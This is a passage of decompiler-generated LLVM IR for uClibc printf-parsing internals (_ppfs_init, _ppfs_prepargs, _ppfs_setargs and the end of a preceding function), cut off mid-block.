  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_10848 ], [ %stack_var_-336.4, %dec_label_pc_10840 ]
  %v1_102f8180 = inttoptr i32 %v0_102f849 to i8*
  %v2_102f8181 = load i8, i8* %v1_102f8180, align 1
  %v3_102f8182 = zext i8 %v2_102f8181 to i32
  store i32 %v3_102f8182, i32* %r3.global-to-local, align 4
  %v2_102fc183 = icmp eq i8 %v2_102f8181, 0
  br i1 %v2_102fc183, label %dec_label_pc_10314, label %bb126

dec_label_pc_10848:                               ; preds = %dec_label_pc_10354
  %v1_10848 = add i32 %v0_1035c, 2
  store i32 %v1_10848, i32* @r4, align 4
  br label %dec_label_pc_102f8.outer

dec_label_pc_10850:                               ; preds = %dec_label_pc_106c0, %dec_label_pc_10824, %.thread36, %dec_label_pc_10770, %dec_label_pc_10754, %dec_label_pc_10624, %bb162, %dec_label_pc_10588, %bb130, %dec_label_pc_10800
  br label %dec_label_pc_10858

dec_label_pc_10858:                               ; preds = %dec_label_pc_10348, %bb, %dec_label_pc_102c8, %dec_label_pc_10850
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_102c8 ], [ -1, %dec_label_pc_10850 ], [ %stack_var_-336.2, %dec_label_pc_10348 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_10284, i32* @r5, align 4
  store i32 %v15_10284, i32* %r8.global-to-local, align 4
  store i32 %v18_10284, i32* @sb, align 4
  store i32 %v21_10284, i32* @sl, align 4
  store i32 %v24_10284, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_10848, { 1, 0 }
  uselistorder i8 %v2_102f8181, { 1, 2, 0 }
  uselistorder i32 %v0_102f849, { 2, 0, 1 }
  uselistorder i32 %v5_10324, { 2, 3, 1, 0 }
  uselistorder i32 %v0_10424, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_10840, { 1, 0, 2 }
  uselistorder i32 %v1_107d4, { 2, 1, 0 }
  uselistorder i32 %v0_107dc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1075c, { 1, 0 }
  uselistorder i32 %v2_10740, { 2, 0, 1 }
  uselistorder i1 %v3_10720, { 1, 0 }
  uselistorder i32 %v0_10730, { 0, 2, 3, 1 }
  uselistorder i32 %v2_10704, { 1, 0 }
  uselistorder i32 %v0_10748, { 1, 0, 2 }
  uselistorder i32 %v3_106d8, { 1, 2, 0 }
  uselistorder i32 %v0_10688, { 1, 0 }
  uselistorder i32 %v2_1066c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_10634, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10600, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10504, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_10520, { 1, 2, 3, 0 }
  uselistorder i32 %v6_104a0, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_10404, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_103b4.pre, { 2, 1, 0 }
  uselistorder i32 %v1_103ac, { 1, 0 }
  uselistorder i32 %v1_10354, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_10314, { 1, 0 }
  uselistorder i32 %v1_1030c.lcssa, { 1, 0 }
  uselistorder i8 %v2_102f8, { 1, 2, 0 }
  uselistorder i32 %v2_1030c, { 1, 2, 3, 0 }
  uselistorder i1 %v7_10518, { 1, 0 }
  uselistorder i1 %v7_10464, { 1, 2, 0 }
  uselistorder i1 %v7_1065c, { 1, 0 }
  uselistorder i1 %v7_105bc, { 1, 0 }
  uselistorder i1 %v7_104a8, { 1, 0 }
  uselistorder i32 %v2_105fc, { 0, 2, 1, 3 }
  uselistorder i32 %v2_106cc, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_103dc, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_103b0, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_10390, { 1, 2, 0 }
  uselistorder i32 %v4_10388, { 1, 0 }
  uselistorder i32 %v2_1028c, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 38, 3, 4, 1, 2, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 39, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %r2.global-to-local, { 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 26, 20, 21, 23, 24, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 7, 6, 9, 8, 10, 11, 13, 12, 15, 14, 16, 17, 20, 18, 19, 22, 21, 24, 23, 26, 25, 28, 27, 32, 29, 30, 31, 1, 33, 34, 44, 35, 45, 2, 37, 36, 39, 38, 41, 40, 43, 42, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_10858, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10850, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10840, { 1, 0 }
  uselistorder label %dec_label_pc_10800, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_10770, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_1071c, { 1, 0 }
  uselistorder label %dec_label_pc_10700, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10700thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_106f4, { 1, 0 }
  uselistorder label %dec_label_pc_106e4, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_10678, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_10454, { 1, 0 }
  uselistorder label %dec_label_pc_10450, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_103a8, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_10348, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_10314, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_10878 = load i32, i32* @r4, align 4
  store i32 %v3_10878, i32* %stack_var_-12, align 4
  %v6_10878 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_10884 = load i32, i32* @r1, align 4
  store i32 %v0_10884, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_1088c = bitcast i32* %arg1 to i8*
  %v3_1088c = call i32 @__GI_memset(i8* %v2_1088c, i32 0)
  %v0_10890 = load i32, i32* @r4, align 4
  %v1_10890 = add i32 %v0_10890, 24
  %v2_10890 = inttoptr i32 %v1_10890 to i32*
  %v3_10890 = load i32, i32* %v2_10890, align 4
  %v1_10894 = add i32 %v3_10890, -1
  store i32 %v1_10894, i32* %v2_10890, align 4
  %v0_1089c = load i32, i32* @r5, align 4
  %v1_1089c = load i32, i32* @r4, align 4
  %v2_1089c = inttoptr i32 %v1_1089c to i32*
  store i32 %v0_1089c, i32* %v2_1089c, align 4
  %v0_108a0 = load i32, i32* @r4, align 4
  %v1_108a0 = add i32 %v0_108a0, 40
  store i32 %v1_108a0, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_108b019 = inttoptr i32 %v1_108a0 to i32*
  store i32 8, i32* %v2_108b019, align 4
  %v3_108b020 = load i32, i32* %r1.global-to-local, align 4
  %v4_108b021 = add i32 %v3_108b020, 4
  store i32 %v4_108b021, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_108a8.dec_label_pc_108a8_crit_edge

dec_label_pc_108a8.dec_label_pc_108a8_crit_edge:  ; preds = %entry, %dec_label_pc_108a8.dec_label_pc_108a8_crit_edge
  %v4_108b022 = phi i32 [ %v4_108b021, %entry ], [ %v4_108b0, %dec_label_pc_108a8.dec_label_pc_108a8_crit_edge ]
  %v0_108ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_108ac = add i32 %v0_108ac.pre, -1
  store i32 %v1_108ac, i32* %r2.global-to-local, align 4
  %v7_108ac = icmp eq i32 %v0_108ac.pre, 1
  %v2_108b0 = inttoptr i32 %v4_108b022 to i32*
  store i32 8, i32* %v2_108b0, align 4
  %v3_108b0 = load i32, i32* %r1.global-to-local, align 4
  %v4_108b0 = add i32 %v3_108b0, 4
  store i32 %v4_108b0, i32* %r1.global-to-local, align 4
  br i1 %v7_108ac, label %dec_label_pc_108b8, label %dec_label_pc_108a8.dec_label_pc_108a8_crit_edge

dec_label_pc_108b8:                               ; preds = %dec_label_pc_108a8.dec_label_pc_108a8_crit_edge
  %v0_108b8 = load i32, i32* @r5, align 4
  store i32 %v0_108b8, i32* %r2.global-to-local, align 4
  %v1_108fc3 = inttoptr i32 %v0_108b8 to i8*
  %v2_108fc4 = load i8, i8* %v1_108fc3, align 1
  %v2_109006 = icmp eq i8 %v2_108fc4, 0
  br i1 %v2_109006, label %dec_label_pc_10908, label %dec_label_pc_108c8

dec_label_pc_108c0:                               ; preds = %dec_label_pc_108e0
  %v2_108c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_108c4, i32* @r4, align 4
  store i32 %v6_10878, i32* @r5, align 4
  ret i32 -1

dec_label_pc_108c8:                               ; preds = %dec_label_pc_108b8, %dec_label_pc_108fc.backedge
  %v0_108d0 = phi i32 [ %storemerge, %dec_label_pc_108fc.backedge ], [ %v0_108b8, %dec_label_pc_108b8 ]
  %v2_108fc7 = phi i8 [ %v2_108fc, %dec_label_pc_108fc.backedge ], [ %v2_108fc4, %dec_label_pc_108b8 ]
  %v7_108c8 = icmp eq i8 %v2_108fc7, 37
  br i1 %v7_108c8, label %dec_label_pc_108d0, label %dec_label_pc_108f8

dec_label_pc_108d0:                               ; preds = %dec_label_pc_108c8
  %v1_108d0 = add i32 %v0_108d0, 1
  %v2_108d0 = inttoptr i32 %v1_108d0 to i8*
  %v3_108d0 = load i8, i8* %v2_108d0, align 1
  store i32 %v1_108d0, i32* %r2.global-to-local, align 4
  %v7_108d4 = icmp eq i8 %v3_108d0, 37
  br i1 %v7_108d4, label %dec_label_pc_108f8, label %dec_label_pc_108e0

dec_label_pc_108e0:                               ; preds = %dec_label_pc_108d0
  %v0_108d8 = load i32, i32* @r4, align 4
  %v2_108e0 = inttoptr i32 %v0_108d8 to i32*
  store i32 %v1_108d0, i32* %v2_108e0, align 4
  %v2_108e4 = call i32 @_ppfs_parsespec(i32* %v2_108e0)
  %v1_108e8 = icmp slt i32 %v2_108e4, 0
  br i1 %v1_108e8, label %dec_label_pc_108c0, label %dec_label_pc_108f0

dec_label_pc_108f0:                               ; preds = %dec_label_pc_108e0
  %v0_108f0 = load i32, i32* @r4, align 4
  %v1_108f0 = inttoptr i32 %v0_108f0 to i32*
  %v2_108f0 = load i32, i32* %v1_108f0, align 4
  br label %dec_label_pc_108fc.backedge

dec_label_pc_108f8:                               ; preds = %dec_label_pc_108c8, %dec_label_pc_108d0
  %v0_108f8 = phi i32 [ %v0_108d0, %dec_label_pc_108c8 ], [ %v1_108d0, %dec_label_pc_108d0 ]
  %v1_108f8 = add i32 %v0_108f8, 1
  br label %dec_label_pc_108fc.backedge

dec_label_pc_108fc.backedge:                      ; preds = %dec_label_pc_108f8, %dec_label_pc_108f0
  %storemerge = phi i32 [ %v1_108f8, %dec_label_pc_108f8 ], [ %v2_108f0, %dec_label_pc_108f0 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_108fc = inttoptr i32 %storemerge to i8*
  %v2_108fc = load i8, i8* %v1_108fc, align 1
  %v2_10900 = icmp eq i8 %v2_108fc, 0
  br i1 %v2_10900, label %dec_label_pc_108fc.dec_label_pc_10908_crit_edge, label %dec_label_pc_108c8

dec_label_pc_108fc.dec_label_pc_10908_crit_edge:  ; preds = %dec_label_pc_108fc.backedge
  %v0_10908.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10908

dec_label_pc_10908:                               ; preds = %dec_label_pc_108fc.dec_label_pc_10908_crit_edge, %dec_label_pc_108b8
  %v0_10908 = phi i32 [ %v0_10908.pre, %dec_label_pc_108fc.dec_label_pc_10908_crit_edge ], [ %v0_108b8, %dec_label_pc_108b8 ]
  %v3_108fc.lcssa.in = phi i8 [ %v2_108fc, %dec_label_pc_108fc.dec_label_pc_10908_crit_edge ], [ %v2_108fc4, %dec_label_pc_108b8 ]
  %v3_108fc.lcssa = zext i8 %v3_108fc.lcssa.in to i32
  %v1_10908 = load i32, i32* @r4, align 4
  %v2_10908 = inttoptr i32 %v1_10908 to i32*
  store i32 %v0_10908, i32* %v2_10908, align 4
  %v2_1090c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1090c, i32* @r4, align 4
  store i32 %v6_10878, i32* @r5, align 4
  ret i32 %v3_108fc.lcssa

; uselistorder directives
  uselistorder i8 %v2_108fc, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_108b8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_108b0, { 1, 0 }
  uselistorder i32 %v0_108ac.pre, { 1, 0 }
  uselistorder i32 %v6_10878, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder label %dec_label_pc_108f8, { 1, 0 }
  uselistorder label %dec_label_pc_108c8, { 1, 0 }
  uselistorder label %dec_label_pc_108a8.dec_label_pc_108a8_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10910 = load i32, i32* @r4, align 4
  store i32 %v3_10910, i32* %stack_var_-12, align 4
  %v1_10914 = add i32 %arg1, 24
  %v2_10914 = inttoptr i32 %v1_10914 to i32*
  %v3_10914 = load i32, i32* %v2_10914, align 4
  store i32 %v3_10914, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_10924 = add i32 %arg1, 76
  %v3_10924 = inttoptr i32 %v2_10924 to i32*
  store i32 %arg2, i32* %v3_10924, align 4
  %v7_10928 = icmp sgt i32 %v3_10914, 0
  br i1 %v7_10928, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_10928 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_10928, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_1092c = load i32, i32* %r3.global-to-local, align 4
  %v2_1092c = add i32 %arg1, 8
  %v3_1092c = inttoptr i32 %v2_1092c to i32*
  store i32 %v0_1092c, i32* %v3_1092c, align 4
  %v0_10930 = load i32, i32* %r5.global-to-local, align 4
  %v2_10930 = add i32 %arg1, 28
  %v3_10930 = inttoptr i32 %v2_10930 to i32*
  store i32 %v0_10930, i32* %v3_10930, align 4
  %v0_10934 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10934, i32* %v2_10914, align 4
  %v0_10938 = load i32, i32* %r3.global-to-local, align 4
  %v2_10938 = add i32 %arg1, 4
  %v3_10938 = inttoptr i32 %v2_10938 to i32*
  store i32 %v0_10938, i32* %v3_10938, align 4
  %v0_1093c = call i32 @_ppfs_setargs()
  %v0_10940 = load i32, i32* %r5.global-to-local, align 4
  %v1_10940 = load i32, i32* @r4, align 4
  %v2_10940 = add i32 %v1_10940, 24
  %v3_10940 = inttoptr i32 %v2_10940 to i32*
  store i32 %v0_10940, i32* %v3_10940, align 4
  %v2_10944 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10944, i32* @r4, align 4
  ret i32 %v0_1093c

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 6, 4, 5, 2, 1, 3, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_10948 = load i32, i32* @r0, align 4
  %v1_10948 = add i32 %v0_10948, 24
  %v2_10948 = inttoptr i32 %v1_10948 to i32*
  %v3_10948 = load i32, i32* %v2_10948, align 4
  store i32 %v3_10948, i32* %r1.global-to-local, align 4
  %v2_1094c = icmp eq i32 %v3_10948, 0
  %v3_10950 = load i32, i32* @r4, align 4
  store i32 %v3_10950, i32* %stack_var_-8, align 4
  %v1_10954 = add i32 %v0_10948, 80
  store i32 %v1_10954, i32* %ip.global-to-local, align 4
  %v1_10958 = add i32 %v0_10948, 8
  %v2_10958 = inttoptr i32 %v1_10958 to i32*
  %v3_10958 = load i32, i32* %v2_10958, align 4
  store i32 %v3_10958, i32* %r3.global-to-local, align 4
  %v6_10960 = icmp eq i32 %v3_10958, -2147483648
  br i1 %v2_1094c, label %dec_label_pc_10960, label %dec_label_pc_10a84

dec_label_pc_10960:                               ; preds = %entry
  br i1 %v6_10960, label %dec_label_pc_10968, label %dec_label_pc_10980

dec_label_pc_10968:                               ; preds = %dec_label_pc_10960
  %v1_10968 = add i32 %v0_10948, 76
  %v2_10968 = inttoptr i32 %v1_10968 to i32*
  %v3_10968 = load i32, i32* %v2_10968, align 4
  store i32 %v3_10968, i32* %r3.global-to-local, align 4
  %v1_1096c = inttoptr i32 %v3_10968 to i32*
  %v2_1096c = load i32, i32* %v1_1096c, align 4
  store i32 %v2_1096c, i32* %r2.global-to-local, align 4
  %v1_10970 = add i32 %v3_10968, 4
  store i32 %v1_10970, i32* %r3.global-to-local, align 4
  store i32 %v1_10970, i32* %v2_10968, align 4
  %v0_10978 = load i32, i32* %r2.global-to-local, align 4
  %v1_10978 = load i32, i32* @r0, align 4
  %v2_10978 = add i32 %v1_10978, 8
  %v3_10978 = inttoptr i32 %v2_10978 to i32*
  store i32 %v0_10978, i32* %v3_10978, align 4
  %v0_1097c = load i32, i32* %r2.global-to-local, align 4
  %v1_1097c = load i32, i32* @r0, align 4
  %v2_1097c = add i32 %v1_1097c, 80
  %v3_1097c = inttoptr i32 %v2_1097c to i32*
  store i32 %v0_1097c, i32* %v3_1097c, align 4
  %v0_10980.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10980

dec_label_pc_10980:                               ; preds = %dec_label_pc_10960, %dec_label_pc_10968
  %v1_10998 = phi i32 [ %v0_10948, %dec_label_pc_10960 ], [ %v0_10980.pre, %dec_label_pc_10968 ]
  %v1_10980 = add i32 %v1_10998, 4
  %v2_10980 = inttoptr i32 %v1_10980 to i32*
  %v3_10980 = load i32, i32* %v2_10980, align 4
  store i32 %v3_10980, i32* %r3.global-to-local, align 4
  %v6_10984 = icmp eq i32 %v3_10980, -2147483648
  br i1 %v6_10984, label %dec_label_pc_1098c, label %dec_label_pc_109a4

dec_label_pc_1098c:                               ; preds = %dec_label_pc_10980
  %v1_1098c = add i32 %v1_10998, 76
  %v2_1098c = inttoptr i32 %v1_1098c to i32*
  %v3_1098c = load i32, i32* %v2_1098c, align 4
  store i32 %v3_1098c, i32* %r3.global-to-local, align 4
  %v1_10990 = inttoptr i32 %v3_1098c to i32*
  %v2_10990 = load i32, i32* %v1_10990, align 4
  store i32 %v2_10990, i32* %r2.global-to-local, align 4
  %v1_10994 = add i32 %v3_1098c, 4
  store i32 %v1_10994, i32* %r3.global-to-local, align 4
  store i32 %v1_10994, i32* %v2_1098c, align 4
  %v0_1099c = load i32, i32* %r2.global-to-local, align 4
  %v1_1099c = load i32, i32* @r0, align 4
  %v2_1099c = add i32 %v1_1099c, 4
  %v3_1099c = inttoptr i32 %v2_1099c to i32*
  store i32 %v0_1099c, i32* %v3_1099c, align 4
  %v0_109a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_109a0 = load i32, i32* @r0, align 4
  %v2_109a0 = add i32 %v1_109a0, 80
  %v3_109a0 = inttoptr i32 %v2_109a0 to i32*
  store i32 %v0_109a0, i32* %v3_109a0, align 4
  %v0_10a7418.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_109a4

dec_label_pc_109a4:                               ; preds = %dec_label_pc_10980, %dec_label_pc_1098c
  %v0_10a7418 = phi i32 [ %v1_10998, %dec_label_pc_10980 ], [ %v0_10a7418.pre, %dec_label_pc_1098c ]
  %v0_109a4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_109a4, i32* %lr.global-to-local, align 4
  %v1_10a7419 = add i32 %v0_10a7418, 28
  %v2_10a7420 = inttoptr i32 %v1_10a7419 to i32*
  %v3_10a7421 = load i32, i32* %v2_10a7420, align 4
  store i32 %v3_10a7421, i32* %r3.global-to-local, align 4
  %v5_10a7c23 = icmp slt i32 %v0_109a4, %v3_10a7421
  br i1 %v5_10a7c23, label %dec_label_pc_109ac, label %dec_label_pc_10a80.loopexit

dec_label_pc_109ac:                               ; preds = %dec_label_pc_109a4, %dec_label_pc_10a70
  %v0_10a7425 = phi i32 [ %v0_10a74, %dec_label_pc_10a70 ], [ %v0_10a7418, %dec_label_pc_109a4 ]
  %v1_109ac24 = phi i32 [ %v1_10a70, %dec_label_pc_10a70 ], [ %v0_109a4, %dec_label_pc_109a4 ]
  %v4_109ac = mul i32 %v1_109ac24, 4
  %v5_109ac = add i32 %v0_10a7425, %v4_109ac
  store i32 %v5_109ac, i32* %r3.global-to-local, align 4
  %v1_109b0 = add i32 %v5_109ac, 40
  %v2_109b0 = inttoptr i32 %v1_109b0 to i32*
  %v3_109b0 = load i32, i32* %v2_109b0, align 4
  store i32 %v3_109b0, i32* %r2.global-to-local, align 4
  %v7_109b4 = icmp eq i32 %v3_109b0, 8
  br i1 %v7_109b4, label %dec_label_pc_10a70, label %dec_label_pc_109bc

dec_label_pc_109bc:                               ; preds = %dec_label_pc_109ac
  %v1_109bc = add i32 %v0_10a7425, 76
  %v2_109bc = inttoptr i32 %v1_109bc to i32*
  %v3_109bc = load i32, i32* %v2_109bc, align 4
  store i32 %v3_109bc, i32* %r1.global-to-local, align 4
  %v8_109c0 = icmp sgt i32 %v3_109b0, 8
  br i1 %v8_109c0, label %dec_label_pc_109e4, label %dec_label_pc_109c4

dec_label_pc_109c4:                               ; preds = %dec_label_pc_109bc
  %v7_109c4 = icmp eq i32 %v3_109b0, 2
  br i1 %v7_109c4, label %dec_label_pc_10a30, label %dec_label_pc_109cc

dec_label_pc_109cc:                               ; preds = %dec_label_pc_109c4
  %v8_109cc = icmp sgt i32 %v3_109b0, 2
  br i1 %v8_109cc, label %dec_label_pc_109dc, label %dec_label_pc_109d0

dec_label_pc_109d0:                               ; preds = %dec_label_pc_109cc
  %v1_109d0 = icmp slt i32 %v3_109b0, 0
  br i1 %v1_109d0, label %dec_label_pc_10a5c, label %dec_label_pc_10a30

dec_label_pc_109dc:                               ; preds = %dec_label_pc_109cc
  %v7_109dc = icmp eq i32 %v3_109b0, 7
  br i1 %v7_109dc, label %dec_label_pc_10a44, label %dec_label_pc_10a5c

dec_label_pc_109e4:                               ; preds = %dec_label_pc_109bc
  %v7_109e4 = icmp eq i32 %v3_109b0, 1024
  br i1 %v7_109e4, label %dec_label_pc_10a30, label %dec_label_pc_109ec

dec_label_pc_109ec:                               ; preds = %dec_label_pc_109e4
  %v8_109ec = icmp sgt i32 %v3_109b0, 1024
  br i1 %v8_109ec, label %dec_label_pc_10a04, label %dec_label_pc_109f0

dec_label_pc_109f0:                               ; preds = %dec_label_pc_109ec
  switch i32 %v3_109b0, label %dec_label_pc_10a5c [
    i32 256, label %dec_label_pc_10a30
    i32 512, label %dec_label_pc_10a30
  ]

dec_label_pc_10a04:                               ; preds = %dec_label_pc_109ec
  %v7_10a04 = icmp eq i32 %v3_109b0, 2048
  br i1 %v7_10a04, label %dec_label_pc_10a1c, label %dec_label_pc_10a14

dec_label_pc_10a14:                               ; preds = %dec_label_pc_10a04
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_10a10 = icmp eq i32 %v3_109b0, 2055
  br i1 %v9_10a10, label %dec_label_pc_10a44, label %dec_label_pc_10a5c

dec_label_pc_10a1c:                               ; preds = %dec_label_pc_10a04
  %v1_10a1c = add i32 %v3_109bc, 8
  store i32 %v1_10a1c, i32* %r3.global-to-local, align 4
  store i32 %v1_10a1c, i32* %v2_109bc, align 4
  %v0_10a24 = load i32, i32* %r1.global-to-local, align 4
  %v1_10a24 = inttoptr i32 %v0_10a24 to i32*
  %v2_10a24 = load i32, i32* %v1_10a24, align 4
  store i32 %v2_10a24, i32* %r3.global-to-local, align 4
  %v3_10a24 = add i32 %v0_10a24, 4
  %v4_10a24 = inttoptr i32 %v3_10a24 to i32*
  %v5_10a24 = load i32, i32* %v4_10a24, align 4
  store i32 %v5_10a24, i32* %r4.global-to-local, align 4
  %v0_10a28 = load i32, i32* %ip.global-to-local, align 4
  %v1_10a28 = inttoptr i32 %v0_10a28 to i32*
  store i32 %v2_10a24, i32* %v1_10a28, align 4
  %v3_10a28 = add i32 %v0_10a28, 4
  %v4_10a28 = inttoptr i32 %v3_10a28 to i32*
  %v5_10a28 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_10a28, i32* %v4_10a28, align 4
  br label %dec_label_pc_10a6c

dec_label_pc_10a30:                               ; preds = %dec_label_pc_109f0, %dec_label_pc_109f0, %dec_label_pc_109d0, %dec_label_pc_109e4, %dec_label_pc_109c4
  %v1_10a30 = inttoptr i32 %v3_109bc to i32*
  %v2_10a30 = load i32, i32* %v1_10a30, align 4
  store i32 %v2_10a30, i32* %r2.global-to-local, align 4
  %v1_10a34 = add i32 %v3_109bc, 4
  store i32 %v1_10a34, i32* %r3.global-to-local, align 4
  store i32 %v1_10a34, i32* %v2_109bc, align 4
  %v0_10a3c = load i32, i32* %r2.global-to-local, align 4
  %v1_10a3c = load i32, i32* %ip.global-to-local, align 4
  %v2_10a3c = inttoptr i32 %v1_10a3c to i32*
  store i32 %v0_10a3c, i32* %v2_10a3c, align 4
  br label %dec_label_pc_10a6c

dec_label_pc_10a44:                               ; preds = %dec_label_pc_109dc, %dec_label_pc_10a14
  %v3_10a44 = load i32, i32* %v2_109bc, align 4
  store i32 %v3_10a44, i32* %r3.global-to-local, align 4
  %v1_10a48 = inttoptr i32 %v3_10a44 to i32*
  %v2_10a48 = load i32, i32* %v1_10a48, align 4
  store i32 %v2_10a48, i32* %r1.global-to-local, align 4
  %v3_10a48 = add i32 %v3_10a44, 4
  %v4_10a48 = inttoptr i32 %v3_10a48 to i32*
  %v5_10a48 = load i32, i32* %v4_10a48, align 4
  store i32 %v5_10a48, i32* %r2.global-to-local, align 4
  %v1_10a4c = add i32 %v3_10a44, 8
  store i32 %v1_10a4c, i32* %r3.global-to-local, align 4
  store i32 %v1_10a4c, i32* %v2_109bc, align 4
  %v0_10a54 = load i32, i32* %ip.global-to-local, align 4
  %v1_10a54 = inttoptr i32 %v0_10a54 to i32*
  %v2_10a54 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_10a54, i32* %v1_10a54, align 4
  %v3_10a54 = add i32 %v0_10a54, 4
  %v4_10a54 = inttoptr i32 %v3_10a54 to i32*
  %v5_10a54 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_10a54, i32* %v4_10a54, align 4
  br label %dec_label_pc_10a6c

dec_label_pc_10a5c:                               ; preds = %dec_label_pc_109f0, %dec_label_pc_109dc, %dec_label_pc_109d0, %dec_label_pc_10a14
  %v1_10a5c = add i32 %v3_109bc, 4
  store i32 %v1_10a5c, i32* %r3.global-to-local, align 4
  store i32 %v1_10a5c, i32* %v2_109bc, align 4
  %v0_10a64 = load i32, i32* %r1.global-to-local, align 4
